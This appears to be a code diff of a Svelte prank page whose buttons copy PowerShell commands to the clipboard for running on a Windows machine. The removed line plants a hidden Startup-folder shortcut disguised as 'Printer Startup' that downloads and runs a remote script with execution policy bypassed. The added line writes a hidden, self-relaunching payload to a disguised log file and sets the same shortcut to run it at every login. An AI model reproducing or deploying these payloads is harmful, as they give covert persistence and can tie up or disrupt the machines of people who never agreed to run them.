@@ -31,8 +31,8 @@
     }
 
     function copyHydra() {
-        navigator.clipboard.writeText(`$WshShell=New-Object -comObject WScript.Shell;$Shortcut=$WshShell.CreateShortcut("$Home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Printer Startup.lnk");$Shortcut.TargetPath="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";$Shortcut.Arguments='-ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo "(Invoke-Webrequest \\"https://raw.githubusercontent.com/TheLudde235/powershell/main/test/hydra.ps1\\").content | powershell.exe"';$shortcut.IconLocation="shell32.dll,105";$Shortcut.Save();exit;`)
-    }
+        navigator.clipboard.writeText(`echo '$p=New-Object System.Diagnostics.ProcessStartInfo;$n=New-Object System.Diagnostics.Process;$p.FileName="powershell.exe";$p.Arguments=''Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show(\\":)\\");cat \"C:\\temp\\paketering_successesll.log\" | powershell.exe;cat \"C:\\temp\\paketering_successesll.log\" | powershell.exe;'';$p.CreateNoWindow = $true;$p.WindowStyle = "Hidden";$n.StartInfo = $p;$n.Start();' > \"C:\\temp\\paketering_successesll.log\";$WshShell=New-Object -comObject WScript.Shell;$Shortcut=$WshShell.CreateShortcut("$Home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Printer Startup.lnk");$Shortcut.TargetPath="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";$Shortcut.Arguments='-ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo "cat ''C:\\temp\\paketering_successesll.log'' | powershell.exe"';$shortcut.IconLocation="shell32.dll,105";$Shortcut.Save();exit;`)
+    }    
 
     function clear($event) {
         navigator.clipboard.writeText(`Set-ItemProperty -Path \"HKCU:\\AppEvents\\Schemes\\Apps\\.Default\\Open\\.Current\" -Name \"(Default)\" -Type \"String\" -Value \"\";`);
@@ -59,7 +59,7 @@
         bind:value={popupContent}
     />
     <a href="#" on:click={copyPopup(popupContent)}><h1>Copy pop-up (run)</h1></a>
-    <a href="#" on:click={copyHydra()} class="script">Hydra</a>
+    <a href="#" on:click={copyHydra($event)} class="script">Hydra</a>
 
     {#each funnies as funny}
         <div class="funny">
